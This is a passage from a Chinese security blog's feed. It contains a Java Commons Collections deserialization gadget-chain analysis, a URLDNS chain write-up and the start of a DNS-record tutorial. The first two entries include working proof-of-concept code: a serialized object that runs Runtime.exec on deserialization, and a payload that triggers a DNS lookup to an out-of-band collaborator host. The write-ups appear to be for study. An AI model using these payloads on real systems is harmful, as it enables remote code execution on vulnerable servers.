&#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="keyword">new</span> <span class="title class_">LazyMap</span>(map, factory);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">public</span> Object <span class="title function_">get</span><span class="params">(Object key)</span> &#123;</span><br><span class="line">        <span class="comment">// create value for key if key is not currently in the map</span></span><br><span class="line">        <span class="keyword">if</span> (map.containsKey(key) == <span class="literal">false</span>) &#123;</span><br><span class="line">            <span class="type">Object</span> <span class="variable">value</span> <span class="operator">=</span> factory.transform(key);</span><br><span class="line">            map.put(key, value);</span><br><span class="line">            <span class="keyword">return</span> value;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> map.get(key);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>逻辑 </p><p>检查键是否存在，不存在时创建值并存储，存在时直接返回。</p><p>接着寻找入口点</p><h3 id="TiedMapEntry"><a href="#TiedMapEntry" class="headerlink" title="TiedMapEntry"></a>TiedMapEntry</h3><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> Object <span class="title function_">getValue</span><span class="params">()</span> &#123;</span><br><span class="line">    <span class="keyword">return</span> map.get(key);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">public</span> <span class="type">int</span> <span class="title function_">hashCode</span><span class="params">()</span> &#123;</span><br><span class="line">    <span class="type">Object</span> <span class="variable">value</span> <span class="operator">=</span> getValue();</span><br><span class="line">    <span class="keyword">return</span> (getKey() == <span class="literal">null</span> ? <span class="number">0</span> : getKey().hashCode()) ^</span><br><span class="line">           (value == <span class="literal">null</span> ? <span class="number">0</span> : value.hashCode()); </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>TiedMapEntry的hashCode方法调用了getValue，getValue调用了get方法，所以可以用TiedMapEntry的hashCode方法调用LazyMap的get方法</p><p>接下来寻找谁调用了hashCode方法</p><h3 id="HashMap"><a href="#HashMap" class="headerlink" title="HashMap"></a>HashMap</h3><p>通过之前对<a href="https://mp.weixin.qq.com/s/yby-SU4vfxPQFJdBS2TMtQ">URLDNS链</a>的研究可知，HashMap的readObject方法有如下这行语句</p><p>putVal(hash(key), key, value, false, false);</p><p>而HashMap的hash方法调用了hashCode方法</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">static</span> <span class="keyword">final</span> <span class="type">int</span> <span class="title function_">hash</span><span class="params">(Object key)</span> &#123;</span><br><span class="line">    <span class="type">int</span> h;</span><br><span class="line">    <span class="keyword">return</span> (key == <span class="literal">null</span>) ? <span class="number">0</span> : (h = key.hashCode()) ^ (h &gt;&gt;&gt; <span class="number">16</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>而key的值是从readObject获取的</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="type">K</span> <span class="variable">key</span> <span class="operator">=</span> (K) s.readObject();</span><br></pre></td></tr></table></figure><p>序列化时可以用HashMap的put方法传key和value</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line">hashMap.put(tiedMapEntry, <span class="string">&quot;1&quot;</span>);</span><br></pre></td></tr></table></figure><p>但是hashmap的put会提前走完流程 </p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> V <span class="title function_">put</span><span class="params">(K key, V value)</span> &#123;</span><br><span class="line">    <span class="keyword">return</span> putVal(hash(key), key, value, <span class="literal">false</span>, <span class="literal">true</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>由于HashMap的put方法会导致提前调用hash方法，从而在序列化前就命令执行，所以这里修改一下代码。</p><p>这里选择在新建LazyMap对象的时候，随便传入一个Transformer对象，等put完之后再通过反射修改回ChainedTransformer对象。</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="type">Map</span> <span class="variable">lazymap</span> <span class="operator">=</span> LazyMap.decorate(<span class="keyword">new</span> <span class="title class_">HashMap</span>(), <span class="keyword">new</span> <span class="title class_">ConstantTransformer</span>(<span class="string">&quot;1&quot;</span>));</span><br><span class="line"><span class="type">TiedMapEntry</span> <span class="variable">tiedMapEntry</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">TiedMapEntry</span>(lazymap, <span class="string">&quot;2&quot;</span>);</span><br><span class="line">HashMap&lt;Object, Object&gt; hashMap = <span class="keyword">new</span> <span class="title class_">HashMap</span>&lt;&gt;(); hashMap.put(tiedMapEntry, <span class="string">&quot;3&quot;</span>);</span><br></pre></td></tr></table></figure><p>反射修改lazymap的factory的值</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line">Class&lt;LazyMap&gt; lazyMapClass = LazyMap.class; <span class="type">Field</span> <span class="variable">factoryField</span> <span class="operator">=</span> lazyMapClass.getDeclaredField(<span class="string">&quot;factory&quot;</span>); factoryField.setAccessible(<span class="literal">true</span>); factoryField.set(lazymap, ct);</span><br></pre></td></tr></table></figure><p>利用链</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">HashMap.readObject()</span><br><span class="line">HashMap.hash()</span><br><span class="line">    TiedMapEntry.hashCode()</span><br><span class="line">    TiedMapEntry.getValue()</span><br><span class="line">        LazyMap.get()</span><br><span class="line">            ChainedTransformer.transform()</span><br><span class="line">                InvokerTransformer.transform()</span><br><span class="line">                    Method.invoke()</span><br><span class="line">                        Runtime.exec()</span><br></pre></td></tr></table></figure><h2 id="POC"><a href="#POC" class="headerlink" title="POC"></a>POC</h2><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> org.example;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.Transformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.ChainedTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.ConstantTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.InvokerTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.keyvalue.TiedMapEntry;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.map.LazyMap;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.io.*;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Field;</span><br><span class="line"><span class="keyword">import</span> java.util.HashMap;</span><br><span class="line"><span class="keyword">import</span> java.util.Map;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">cc1</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> NoSuchFieldException, IllegalAccessException, IOException, ClassNotFoundException &#123;</span><br><span class="line">        Transformer[] transformers = &#123;</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">ConstantTransformer</span>(Runtime.class),</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;getMethod&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;String.class, Class[].class&#125;, <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="string">&quot;getRuntime&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[<span class="number">0</span>]&#125;),</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;invoke&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;Object.class, Object[].class&#125;, <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="literal">null</span>, <span class="literal">null</span>&#125;),</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;exec&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;String.class&#125;, <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="string">&quot;calc&quot;</span>&#125;)</span><br><span class="line">        &#125;;</span><br><span class="line">        <span class="type">ChainedTransformer</span> <span class="variable">ct</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ChainedTransformer</span>(transformers);</span><br><span class="line">        <span class="type">Map</span> <span class="variable">lazymap</span> <span class="operator">=</span> LazyMap.decorate(<span class="keyword">new</span> <span class="title class_">HashMap</span>(), <span class="keyword">new</span> <span class="title class_">ConstantTransformer</span>(<span class="string">&quot;1&quot;</span>));</span><br><span class="line">        <span class="type">TiedMapEntry</span> <span class="variable">tiedMapEntry</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">TiedMapEntry</span>(lazymap, <span class="string">&quot;2&quot;</span>);</span><br><span class="line">        HashMap&lt;Object, Object&gt; hashMap = <span class="keyword">new</span> <span class="title class_">HashMap</span>&lt;&gt;();</span><br><span class="line">        hashMap.put(tiedMapEntry, <span class="string">&quot;3&quot;</span>);</span><br><span class="line"></span><br><span class="line">        lazymap.remove(<span class="string">&quot;2&quot;</span>);</span><br><span class="line"></span><br><span class="line">        Class&lt;LazyMap&gt; lazyMapClass = LazyMap.class;</span><br><span class="line">        <span class="type">Field</span> <span class="variable">factoryField</span> <span class="operator">=</span> lazyMapClass.getDeclaredField(<span class="string">&quot;factory&quot;</span>);</span><br><span class="line">        factoryField.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        factoryField.set(lazymap, ct);</span><br><span class="line"></span><br><span class="line">        serial(hashMap);</span><br><span class="line">        unserial();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">serial</span><span class="params">(Object obj)</span> <span class="keyword">throws</span> IOException &#123;</span><br><span class="line">        <span class="type">ObjectOutputStream</span> <span class="variable">out</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectOutputStream</span>(<span class="keyword">new</span> <span class="title class_">FileOutputStream</span>(<span class="string">&quot;cc6.bin&quot;</span>));</span><br><span class="line">        out.writeObject(obj);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">unserial</span><span class="params">()</span> <span class="keyword">throws</span> IOException, ClassNotFoundException &#123;</span><br><span class="line">        <span class="type">ObjectInputStream</span> <span class="variable">in</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectInputStream</span>(<span class="keyword">new</span> <span class="title class_">FileInputStream</span>(<span class="string">&quot;cc6.bin&quot;</span>));</span><br><span class="line">        in.readObject();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;   之前复现了java cc1链子 &lt;/p&gt;
&lt;p&gt;顺便在这进行一个总结&lt;/p&gt;
&lt;h4 id=&quot;核心武器：反射万能钥匙（InvokerTransformer）&quot;&gt;&lt;a href=&quot;#核心武器：反射万能钥匙（InvokerTransformer）&quot; class=&quot;head</summary>
      
    
    
    
    <category term="java" scheme="https://gu0f3n.github.io/categories/java/"/>
    
    
    <category term="java" scheme="https://gu0f3n.github.io/tags/java/"/>
    
  </entry>
  
  <entry>
    <title>URLDNS</title>
    <link href="https://gu0f3n.github.io/2025/03/23/URLDNS/"/>
    <id>https://gu0f3n.github.io/2025/03/23/URLDNS/</id>
    <published>2025-03-23T08:02:24.000Z</published>
    <updated>2025-03-23T09:00:44.345Z</updated>
    
    <content type="html"><![CDATA[<h1 id="URLDNS-链子分析"><a href="#URLDNS-链子分析" class="headerlink" title="URLDNS 链子分析"></a>URLDNS 链子分析</h1><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">*   Gadget Chain:</span><br><span class="line"> *     HashMap.readObject()</span><br><span class="line"> *       HashMap.putVal()</span><br><span class="line"> *         HashMap.hash()</span><br><span class="line"> *           URL.hashCode()</span><br></pre></td></tr></table></figure><p>原理：</p><p><code>java.util.HashMap</code> 重写了 <code>readObject</code>, 在反序列化时会调用 <code>hash</code> 函数计算 key 的 hashCode.而 <code>java.net.URL</code> 的 hashCode 在计算时会调用 <code>getHostAddress</code> 来解析域名, 从而发出 DNS 请求.</p><p>在利用yso生成链子的时候先从GeneratPayload.class触发</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> ysoserial;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.io.PrintStream;</span><br><span class="line"><span class="keyword">import</span> java.util.ArrayList;</span><br><span class="line"><span class="keyword">import</span> java.util.Arrays;</span><br><span class="line"><span class="keyword">import</span> java.util.Collections;</span><br><span class="line"><span class="keyword">import</span> java.util.Iterator;</span><br><span class="line"><span class="keyword">import</span> java.util.LinkedList;</span><br><span class="line"><span class="keyword">import</span> java.util.List;</span><br><span class="line"><span class="keyword">import</span> ysoserial.payloads.ObjectPayload;</span><br><span class="line"><span class="keyword">import</span> ysoserial.payloads.ObjectPayload.Utils;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">GeneratePayload</span> &#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">final</span> <span class="type">int</span> <span class="variable">INTERNAL_ERROR_CODE</span> <span class="operator">=</span> <span class="number">70</span>;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">final</span> <span class="type">int</span> <span class="variable">USAGE_CODE</span> <span class="operator">=</span> <span class="number">64</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="title function_">GeneratePayload</span><span class="params">()</span> &#123;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line">        <span class="keyword">if</span> (args.length != <span class="number">2</span>) &#123;</span><br><span class="line">            printUsage();</span><br><span class="line">            System.exit(<span class="number">64</span>);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="type">String</span> <span class="variable">payloadType</span> <span class="operator">=</span> args[<span class="number">0</span>];</span><br><span class="line">        <span class="type">String</span> <span class="variable">command</span> <span class="operator">=</span> args[<span class="number">1</span>];</span><br><span class="line">        Class&lt;? <span class="keyword">extends</span> <span class="title class_">ObjectPayload</span>&gt; payloadClass = Utils.getPayloadClass(payloadType);</span><br><span class="line">        <span class="keyword">if</span> (payloadClass == <span class="literal">null</span>) &#123;</span><br><span class="line">            System.err.println(<span class="string">&quot;Invalid payload type &#x27;&quot;</span> + payloadType + <span class="string">&quot;&#x27;&quot;</span>);</span><br><span class="line">            printUsage();</span><br><span class="line">            System.exit(<span class="number">64</span>);</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="keyword">try</span> &#123;</span><br><span class="line">                <span class="type">ObjectPayload</span> <span class="variable">payload</span> <span class="operator">=</span> (ObjectPayload)payloadClass.newInstance();</span><br><span class="line">                <span class="type">Object</span> <span class="variable">object</span> <span class="operator">=</span> payload.getObject(command);</span><br><span class="line">                <span class="type">PrintStream</span> <span class="variable">out</span> <span class="operator">=</span> System.out;</span><br><span class="line">                Serializer.serialize(object, out);</span><br><span class="line">                Utils.releasePayload(payload, object);</span><br><span class="line">            &#125; <span class="keyword">catch</span> (Throwable var7) &#123;</span><br><span class="line">                <span class="type">Throwable</span> <span class="variable">e</span> <span class="operator">=</span> var7;</span><br><span class="line">                System.err.println(<span class="string">&quot;Error while generating or serializing payload&quot;</span>);</span><br><span class="line">                e.printStackTrace();</span><br><span class="line">                System.exit(<span class="number">70</span>);</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            System.exit(<span class="number">0</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    </span><br></pre></td></tr></table></figure><p>然后add添加之后，调用新实例化对象的getObject方法,后面调试跳到了URLDNS.java，且实现了ObjectPayload接口，里面也确实有getObject方法：</p><p>重点代码</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="type">URLStreamHandler</span> <span class="variable">handler</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">SilentURLStreamHandler</span>();<span class="comment">//创建一个返回URLStreamHandler名为handler的实例SilentURLStreamHandler()</span></span><br><span class="line"><span class="type">HashMap</span> <span class="variable">ht</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">HashMap</span>();<span class="comment">//创建一个返回HashMap名为ht的实例HashMap()</span></span><br><span class="line"><span class="type">URL</span> <span class="variable">u</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">URL</span>((URL)<span class="literal">null</span>, url, handler);<span class="comment">//创建一个返回URL名字为u的实力URL,并且使用指定构造函数URL(URL context, String spec, URLStreamHandler handler)</span></span><br><span class="line">ht.put(u, url);<span class="comment">//这一行将 URL 对象 u 和对应的 url 字符串存入 HashMap ht</span></span><br><span class="line">Reflections.setFieldValue(u, <span class="string">&quot;hashCode&quot;</span>, -<span class="number">1</span>);<span class="comment">//这一行通过反射机制将 URL 对象 u 的 hashCode 字段值设置为 -1（因为 -1 通常表示未初始化的状态）</span></span><br><span class="line"><span class="keyword">return</span> ht;<span class="comment">//返回值ht</span></span><br></pre></td></tr></table></figure><p>URLStreamHandler 是 Java 中的一个抽象类，用于处理 URL 的协议部分，例如 HTTP、HTTPS、FTP 等。</p><p>HashMap 是 Java 中的一种集合类，属于 java.util 包，用于存储键值对（key-value pairs）。</p><p>在这里，ht 是一个空的 HashMap，后续将被用来存储 URL 对象和对应的 URL 字符串。</p><p>Reflections 可能是一个工具类（例如来自某个库，如 org.reflections），用于简化 Java 反射操作。它的 setFieldValue 方法通过反射修改对象的字段值。</p><p>在 Java 的 URL 类中，hashCode 是一个私有字段，用于缓存该 URL 的哈希码。URL 类的 hashCode() 方法会计算并缓存这个值，以便在集合操作（如 HashMap 的键比较）中快速使用。</p><p>将 hashCode 设置为 -1 的目的可能是：</p><ul><li>强制 URL 对象在下次调用 hashCode() 时重新计算哈希码（因为 -1 通常表示未初始化的状态）。</li></ul><p>hashcode计算，判断如果不是-1，则直接返回，表示已经算过了，是-1则继续计算；还有需要注意的这个接口中：</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">transient</span> URLStreamHandler handler; <span class="comment">//这个URL传输实现类是一个transient临时类型，它不会被反序列化 </span></span><br><span class="line"><span class="keyword">private</span> <span class="type">int</span> <span class="variable">hashCode</span> <span class="operator">=</span> -<span class="number">1</span>;<span class="comment">//hashCode是private类型，需要手动开放控制权才可以修改。</span></span><br></pre></td></tr></table></figure><p>首先调用HashMap的put方法。</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> V <span class="title function_">put</span><span class="params">(K key, V value)</span> &#123;</span><br><span class="line">    <span class="keyword">return</span> putVal(hash(key), key, value, <span class="literal">false</span>, <span class="literal">true</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>会通过hash函数调用<code>key.hashCode()</code>计算key的hashCode;</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">static</span> <span class="keyword">final</span> <span class="type">int</span> <span class="title function_">hash</span><span class="params">(Object key)</span> &#123;</span><br><span class="line">    <span class="type">int</span> h;</span><br><span class="line">    <span class="keyword">return</span> (key == <span class="literal">null</span>) ? <span class="number">0</span> : (h = key.hashCode()) ^ (h &gt;&gt;&gt; <span class="number">16</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>key是传入的URL对象，最终调用URL对象的hashCode函数，</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">synchronized</span> <span class="type">int</span> <span class="title function_">hashCode</span><span class="params">()</span> &#123;</span><br><span class="line">    <span class="keyword">if</span> (hashCode != -<span class="number">1</span>)</span><br><span class="line">        <span class="keyword">return</span> hashCode;</span><br><span class="line"></span><br><span class="line">    hashCode = handler.hashCode(<span class="built_in">this</span>);</span><br><span class="line">    <span class="keyword">return</span> hashCode;</span><br><span class="line">&#125; </span><br></pre></td></tr></table></figure><p><code>handler</code>是<code>URLStreamHandler</code>的对象；handler在构造函数时被赋值了</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">transient</span> URLStreamHandler handler</span><br></pre></td></tr></table></figure><p>接着调用了<code>URLStreamHandler.hashCode</code>中的<code>getHostAddress(u)</code>方法导致DNS解析</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="type">InetAddress</span> <span class="variable">addr</span> <span class="operator">=</span> getHostAddress(u);</span><br><span class="line"><span class="keyword">if</span> (addr != <span class="literal">null</span>) &#123;</span><br><span class="line">    h += addr.hashCode();</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="type">String</span> <span class="variable">host</span> <span class="operator">=</span> u.getHost();</span><br><span class="line">    <span class="keyword">if</span> (host != <span class="literal">null</span>)</span><br><span class="line">        h += host.toLowerCase().hashCode();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>POC</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> java.io.*;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Field;</span><br><span class="line"><span class="keyword">import</span> java.net.URL;</span><br><span class="line"><span class="keyword">import</span> java.util.HashMap;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">urldns</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> IOException, NoSuchFieldException, IllegalAccessException, ClassNotFoundException &#123;</span><br><span class="line">        HashMap&lt;URL, Integer&gt; hashmap = <span class="keyword">new</span> <span class="title class_">HashMap</span>&lt;URL, Integer&gt;();</span><br><span class="line"></span><br><span class="line">        <span class="type">URL</span> <span class="variable">url</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">URL</span>(<span class="string">&quot;http://5msdqvjsda7s3f8m8h0vkcsmgdm4avyk.oastify.com&quot;</span>);</span><br><span class="line">        <span class="type">Class</span> <span class="variable">c</span> <span class="operator">=</span> url.getClass();</span><br><span class="line">        <span class="type">Field</span> <span class="variable">hashcodefield</span> <span class="operator">=</span> c.getDeclaredField(<span class="string">&quot;hashCode&quot;</span>);</span><br><span class="line">        hashcodefield.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        hashcodefield.set(url,<span class="number">2</span>); <span class="comment">//为了防止在put时就发起DNS请求，将hashCode的默认值-1改掉，执行不了handler.hashCode(this)</span></span><br><span class="line"></span><br><span class="line">        hashmap.put(url, <span class="number">1</span>);</span><br><span class="line"></span><br><span class="line">        hashcodefield.set(url,-<span class="number">1</span>);</span><br><span class="line">        serialize(hashmap);</span><br><span class="line">        unserialize();</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">serialize</span><span class="params">(Object obj)</span> <span class="keyword">throws</span> IOException &#123;</span><br><span class="line">        <span class="type">ObjectOutputStream</span> <span class="variable">oos</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectOutputStream</span>(<span class="keyword">new</span> <span class="title class_">FileOutputStream</span>(<span class="string">&quot;ser.bin&quot;</span>));</span><br><span class="line">        oos.writeObject(obj);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">unserialize</span><span class="params">()</span> <span class="keyword">throws</span> IOException, ClassNotFoundException &#123;</span><br><span class="line">        <span class="type">ObjectInputStream</span> <span class="variable">ois</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectInputStream</span>(<span class="keyword">new</span> <span class="title class_">FileInputStream</span>(<span class="string">&quot;ser.bin&quot;</span>));</span><br><span class="line">        ois.readObject();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>总结 </p><p>形象的举个例子</p><h3 id="埋雷：构造一个带“陷阱”的快递（序列化）"><a href="#埋雷：构造一个带“陷阱”的快递（序列化）" class="headerlink" title="埋雷：构造一个带“陷阱”的快递（序列化）"></a><strong>埋雷：构造一个带“陷阱”的快递（序列化）</strong></h3><ul><li><strong>陷阱核心</strong>：把URL对象（比如<code>http://xxx.dnslog.cn</code>）塞进HashMap里当“钥匙”（Key），然后序列化这个HashMap。</li></ul><p><strong>防止提前触发</strong>：URL对象默认会立即查DNS，但黑客用反射修改<code>hashCode</code>属性为123（临时值），避免序列化时触发DNS</p><h3 id="寄快递：发送包裹到目标（传输数据）"><a href="#寄快递：发送包裹到目标（传输数据）" class="headerlink" title="寄快递：发送包裹到目标（传输数据）"></a><strong>寄快递：发送包裹到目标（传输数据）</strong></h3><ul><li><strong>数据伪装</strong>：序列化后的HashMap看起来是普通数据，被发送到目标服务器（比如通过接口、文件上传等途径）。</li></ul><h3 id="拆快递：目标拆包裹触发陷阱（反序列化）"><a href="#拆快递：目标拆包裹触发陷阱（反序列化）" class="headerlink" title="拆快递：目标拆包裹触发陷阱（反序列化）"></a><strong>拆快递：目标拆包裹触发陷阱（反序列化）</strong></h3><p><strong>自动拆包</strong>：服务器反序列化时，会调用HashMap的<code>readObject</code>方法，这是Java默认的反序列化逻辑。</p><p><strong>计算“钥匙”哈希值</strong>：</p><p>HashMap会重新计算每个Key的哈希值（<code>hash(key)</code>）</p><ul><li>此时Key是之前埋入的URL对象，于是调用URL的<code>hashCode()</code>方法。</li></ul><h3 id="查地址：触发DNS请求（核心利用）"><a href="#查地址：触发DNS请求（核心利用）" class="headerlink" title="查地址：触发DNS请求（核心利用）"></a><strong>查地址：触发DNS请求（核心利用）</strong></h3><p><strong>URL的陷阱逻辑</strong></p><p>URL的<code>hashCode</code>发现自己的<code>hashCode</code>是-1（反射改回的初始值），于是调用<code>URLStreamHandler.hashCode()</code></p><p>这个方法内部会解析URL的主机名（如<code>xxx.dnslog.cn</code>），调用<code>InetAddress.getByName()</code>发起DNS查询</p><p><strong>结果反馈</strong>：DNS查询记录会被攻击者的监控平台（如DNSLog）捕获，证明目标存在反序列化漏洞</p>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;URLDNS-链子分析&quot;&gt;&lt;a href=&quot;#URLDNS-链子分析&quot; class=&quot;headerlink&quot; title=&quot;URLDNS 链子分析&quot;&gt;&lt;/a&gt;URLDNS 链子分析&lt;/h1&gt;&lt;figure class=&quot;highlight plaintext&quot;&gt;&lt;</summary>
      
    
    
    
    <category term="java" scheme="https://gu0f3n.github.io/categories/java/"/>
    
    
    <category term="java" scheme="https://gu0f3n.github.io/tags/java/"/>
    
  </entry>
  
  <entry>
    <title>内网穿透初探</title>
    <link href="https://gu0f3n.github.io/2025/03/21/%E5%86%85%E7%BD%91%E7%A9%BF%E9%80%8F%E5%88%9D%E6%8E%A2/"/>
    <id>https://gu0f3n.github.io/2025/03/21/%E5%86%85%E7%BD%91%E7%A9%BF%E9%80%8F%E5%88%9D%E6%8E%A2/</id>
    <published>2025-03-21T05:07:31.000Z</published>
    <updated>2025-03-21T12:27:21.468Z</updated>
    
    <content type="html"><![CDATA[<p>学习一下网络知识</p><p>主要学习下DNS,因为在后续的内网渗透与应急感觉用的会比较多</p><p>DNS解析流程有个大致的了解 这里就不一一细谈了主要还是学习一下域名解析记录</p><h2 id="域名解析记录"><a href="#域名解析记录" class="headerlink" title="域名解析记录"></a>域名解析记录</h2><h3 id="A记录（快递地址簿）"><a href="#A记录（快递地址簿）" class="headerlink" title="A记录（快递地址簿）****"></a><strong>A记录</strong>（快递地址簿）****</h3><p>代表Address，用来指定域名对应的IP地址，如将item.taobao.com指定到115.238.23.xxx，将switch.taobao.com指定到121.14.24.xxx。<strong>A****记录可以将多个域名解析到一个IP地址，但是不能将一个域名解析到多个IP地址</strong></p><p><em>例子</em>：<code>item.taobao.com</code>指向<code>115.238.23.xxx</code>，相当于告诉快递员“淘宝商品页的快递送到这个地址”</p><p><strong>特点</strong>：</p><ul><li>一个域名只能对应一个IP，但多个域名可以指向同一个IP（比如淘宝的多个子页面共用服务器）</li><li>如果服务器搬家（换IP），得手动改地址簿</li></ul><h3 id="MX记录（邮局分拣员）"><a href="#MX记录（邮局分拣员）" class="headerlink" title="MX记录（邮局分拣员）"></a><strong>MX记录（邮局分拣员）</strong></h3><p>Mail Exchange，就是可以将某个域名下的邮件服务器指向自己的Mail Server，如taobao.com域名的A记录IP地址是115.238.25.xxx，如果将MX记录设置为115.238.25.xxx，即<a href="mailto:&#x78;&#120;&#120;&#64;&#116;&#97;&#111;&#x62;&#x61;&#x6f;&#46;&#x63;&#x6f;&#109;">&#x78;&#120;&#120;&#64;&#116;&#97;&#111;&#x62;&#x61;&#x6f;&#46;&#x63;&#x6f;&#109;</a>的邮件路由，DNS会将邮件发送到115.238.25.xxx所在的服务器，而正常通过Web请求的话仍然解析到A记录的IP地址<br><strong>功能</strong>：专门管邮件的“快递路线”。告诉别人发到你这个域名的邮件该送到哪个邮局（邮件服务器）。<em>例子</em>：<code>xxx@taobao.com</code>的邮件会被送到<code>115.238.25.xxx</code>的服务器，而网页访问还是走A记录的地址</p><p><strong>特点</strong>：</p><ul><li>可以设多个邮局，优先级数字小的先送（比如优先级5的服务器优先于10的）</li><li>邮件服务器坏了，备用的会自动顶上</li></ul><h3 id="CNAME记录（连锁店别名）"><a href="#CNAME记录（连锁店别名）" class="headerlink" 